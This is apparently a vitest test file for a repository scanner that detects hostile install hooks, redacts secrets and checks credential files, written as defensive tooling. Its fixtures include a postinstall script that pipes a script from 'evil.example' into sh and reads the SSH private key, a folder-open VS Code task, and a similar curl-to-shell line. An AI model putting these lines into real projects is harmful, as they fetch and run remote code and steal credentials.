import { mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { ApiFailure } from '../src/client.js';
import { CliError } from '../src/errors.js';
import { runScan, type ScanOptions } from '../src/scan.js';
import { analyzeLikeApi, fakeClient, trustState } from './fakes.js';
import { makeRepo, tmp, TOKEN } from './helpers.js';

const opts = (p: string, o: Partial<ScanOptions> = {}): ScanOptions => ({ path: p, untrusted: false, offline: false, machine: false, reportTokens: false, ...o });
const deps = (client: ReturnType<typeof fakeClient> | null, home = '/nonexistent-home') => ({ client, subject: 'alice@laptop', home, platform: process.platform });

const MALICIOUS = {
  'package.json': JSON.stringify({ name: 'coding-test', description: 'PRIVATE-DESCRIPTION', scripts: { start: 'node index.js', postinstall: 'node scripts/setup.js' } }),
  'scripts/setup.js': "const {execSync}=require('child_process');\nexecSync('curl -fsSL https://evil.example/i.sh | sh');\nrequire('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');",
  '.vscode/tasks.json': '{"tasks":[{"label":"s","command":"node scripts/setup.js","runOptions":{"runOn":"folderOpen"}}]}',
  'README.md': '# a coding test',
};

describe('what leaves the machine', () => {
  it('sends only code that runs on its own, and only the relevant slice of the manifest', async () => {
    const root = await makeRepo({ ...MALICIOUS, 'AGENTS.md': '# Build\nRun npm test.', 'src/index.js': 'console.log(1)' });
    const client = fakeClient();
    const r = await runScan(opts(root), deps(client));
    const sentPaths = r.artifacts.filter((a) => a.sent).map((a) => a.rel).sort();
    expect(sentPaths).toEqual(['.vscode/tasks.json', 'package.json', 'scripts/setup.js']);
    expect(r.artifacts.find((a) => a.rel === 'AGENTS.md')).toMatchObject({ sent: false }); // benign instruction file stays local
    const body = client.analyzed.map((a) => a.content).join('\n');
    expect(body).not.toContain('PRIVATE-DESCRIPTION');
    expect(body).not.toContain('README');
    expect(client.analyzed.every((a) => a.subject === 'alice@laptop')).toBe(true);
  });

  it('redacts secrets before anything is sent', async () => {
    const root = await makeRepo({
      'package.json': JSON.stringify({ scripts: { postinstall: `curl -H "Authorization: token ${TOKEN}" https://api.example/x && node s.js` } }),
      's.js': `const k = "${TOKEN}"; // DEPLOY_TOKEN=supersecretvalue123`,
    });
    const client = fakeClient();
    const r = await runScan(opts(root), deps(client));
    const body = client.analyzed.map((a) => a.content).join('\n');
    expect(body).not.toContain(TOKEN);
    expect(body).not.toContain('supersecretvalue123');
    expect(body).toContain('[REDACTED:github_token]');
    expect(r.artifacts.reduce((n, a) => n + a.redactions, 0)).toBeGreaterThanOrEqual(2);
  });

  it('never sends .env contents, files behind a symlink, or hostile text from outside the repo', async () => {
    const outside = await makeRepo({ 'id_rsa': 'OUTSIDE-SECRET-MATERIAL' });
    const root = await makeRepo({ ...MALICIOUS, '.env': `DEPLOY_TOKEN=${TOKEN}\nDB=ENV-ONLY-VALUE` }, { 'leak.txt': path.join(outside, 'id_rsa') });
    const client = fakeClient();
    const r = await runScan(opts(root), deps(client));
    const wire = JSON.stringify(client.analyzed) + JSON.stringify(client.ingested);
    for (const secret of [TOKEN, 'ENV-ONLY-VALUE', 'OUTSIDE-SECRET-MATERIAL']) expect(wire).not.toContain(secret);
    expect(r.secrets.map((s) => s.rel)).toEqual(['.env']);
    expect(r.otherFindings.map((f) => f.id)).toContain('local.symlink_escape');
  });

  it('offline: nothing is sent and the verdict still comes from local checks', async () => {
    const root = await makeRepo(MALICIOUS);
    const client = fakeClient();
    const r = await runScan(opts(root, { offline: true }), deps(client));
    expect(client.order).toEqual([]);
    expect(r).toMatchObject({ mode: 'local', label: 'malicious', risk: 85 });
    const none = await runScan(opts(root), deps(null)); // not configured behaves the same
    expect(none.mode).toBe('local');
  });

  it('caps how many artifacts are sent, flagged ones first, and says so', async () => {
    const files: Record<string, string> = { 'package.json': JSON.stringify({ scripts: { postinstall: 'node a.js' } }), 'a.js': 'curl https://x.test/a | sh' };
    for (let i = 0; i < 6; i++) files[`.husky/h${i}`] = 'npm test';
    const client = fakeClient();
    const r = await runScan(opts(await makeRepo(files), { maxSend: 3 }), deps(client));
    expect(client.analyzed).toHaveLength(3);
    expect(client.analyzed[0]!.content).toContain('curl');
    expect(r.warnings.join(' ')).toMatch(/not sent for review/);
  });
});

describe('verdicts and trust', () => {
  it('a benign repository is benign, sends nothing, and fetches no trust', async () => {
    const client = fakeClient();
    const r = await runScan(opts(await makeRepo({ 'package.json': '{"scripts":{"test":"vitest"}}', 'src/a.ts': 'x' })), deps(client));
    expect(r).toMatchObject({ label: 'benign', risk: 0, trust: undefined });
    expect(client.order).toEqual([]);
  });

  it('serious signals in different files add up locally, and a remote verdict can raise but not hide anything', async () => {
    const r = await runScan(opts(await makeRepo(MALICIOUS), { offline: true }), deps(null));
    expect(r.risk).toBe(85);
    const client = fakeClient({ analyze: (k, c) => ({ ...analyzeLikeApi(k, c), payload: { ...analyzeLikeApi(k, c).payload, riskScore: 92, verdict: 'malicious' as const } }) });
    const online = await runScan(opts(await makeRepo({ 'package.json': '{"scripts":{"postinstall":"node ok.js"}}', 'ok.js': 'console.log(1)' })), deps(client));
    expect(online).toMatchObject({ label: 'malicious', risk: 92 });
  });

  it('records an untrusted repo before analysing, then returns the updated trust state', async () => {
    const client = fakeClient({ trust: trustState('alice@laptop', 55, 'elevated', ['Artifact judged malicious']) });
    const r = await runScan(opts(await makeRepo(MALICIOUS), { untrusted: true }), deps(client));
    expect(client.order[0]).toBe('ingest');
    expect(client.ingested[0]).toMatchObject([{ subject: 'alice@laptop', kind: 'untrusted_repo_opened' }]);
    expect(client.trusts).toEqual(['alice@laptop']);
    expect(r.trust).toMatchObject({ level: 'elevated', risk: 55 });
  });
});

describe('failure handling', () => {
  it('a rejected API key stops the scan with a clear error', async () => {
    const client = fakeClient({ analyze: () => { throw new ApiFailure(401, 'unauthorized', 'Missing or invalid API key'); } });
    await expect(runScan(opts(await makeRepo(MALICIOUS)), deps(client))).rejects.toThrow(/rejected your API key/);
  });

  it('an API failure on one artifact degrades gracefully: others are reviewed, local checks still count', async () => {
    let n = 0;
    const client = fakeClient({ analyze: (k, c) => { if (++n === 1) throw new ApiFailure(500, 'internal_error', 'boom'); return analyzeLikeApi(k, c); } });
    const r = await runScan(opts(await makeRepo(MALICIOUS)), deps(client));
    expect(r.artifacts.some((a) => a.error)).toBe(true);
    expect(r.artifacts.some((a) => a.sent)).toBe(true);
    expect(r.warnings.join(' ')).toMatch(/could not be reviewed/);
    expect(r.label).toBe('malicious');
  });

  it('an unreachable API fails the untrusted-event call softly and still scans', async () => {
    const client = fakeClient();
    client.ingest = async () => { throw new ApiFailure(0, 'unreachable', 'Could not reach the KNK API'); };
    const r = await runScan(opts(await makeRepo(MALICIOUS), { untrusted: true }), deps(client));
    expect(r.warnings.join(' ')).toMatch(/Could not record the untrusted repo event/);
    expect(r.artifacts.some((a) => a.sent)).toBe(true);
  });

  it('rejects a missing path and a file', async () => {
    const dir = await tmp();
    await writeFile(path.join(dir, 'f.txt'), 'x');
    await expect(runScan(opts(path.join(dir, 'nope')), deps(null))).rejects.toBeInstanceOf(CliError);
    await expect(runScan(opts(path.join(dir, 'f.txt')), deps(null))).rejects.toThrow(/must be a directory/);
  });
});

describe('machine credential check (opt-in)', () => {
  async function homeWithCreds() {
    const home = await tmp('knk-home-');
    const w = async (rel: string, text: string, mode = 0o600) => {
      await mkdir(path.dirname(path.join(home, rel)), { recursive: true });
      await writeFile(path.join(home, rel), text, { mode });
    };
    await w('.aws/credentials', '[default]\naws_secret_access_key = AWS-SECRET-VALUE');
    await w('.npmrc', '//registry.npmjs.org/:_authToken=npm_NPM-SECRET-VALUE', 0o644);
    await w('.ssh/id_ed25519', 'SSH-PRIVATE-MATERIAL');
    await w('.ssh/id_ed25519.pub', 'ssh-ed25519 AAAA');
    await w('.docker/config.json', '{"auths":{"x":{}}}'); // no auth token: not a credential
    return home;
  }

  it('reports types and permissions only, never contents, and sends nothing by default', async () => {
    const home = await homeWithCreds();
    const client = fakeClient();
    const r = await runScan(opts(await makeRepo({ 'a.txt': 'x' }), { machine: true }), deps(client, home));
    expect(r.machine!.map((m) => m.type).sort()).toEqual(['aws', 'npm', 'ssh_key']);
    expect(r.machine!.find((m) => m.type === 'npm')!.loose).toBe(process.platform !== 'win32');
    expect(r.machine!.find((m) => m.type === 'aws')!.loose).toBe(false);
    const all = JSON.stringify(r);
    for (const s of ['AWS-SECRET-VALUE', 'NPM-SECRET-VALUE', 'SSH-PRIVATE-MATERIAL']) expect(all).not.toContain(s);
    expect(client.ingested).toEqual([]); // ordinary developers have these files; it must not raise anyone's risk by itself
  });

  it('--report-tokens sends ONE summary event with types only, no paths and no values', async () => {
    const home = await homeWithCreds();
    const client = fakeClient();
    await runScan(opts(await makeRepo({ 'a.txt': 'x' }), { machine: true, reportTokens: true }), deps(client, home));
    expect(client.ingested).toHaveLength(1);
    expect(client.ingested[0]).toMatchObject([{ kind: 'deploy_token_on_disk', attrs: { location: 'home', count: 3 } }]);
    const wire = JSON.stringify(client.ingested);
    expect(wire).not.toContain('.aws');
    expect(wire).not.toContain('SECRET');
  });
});
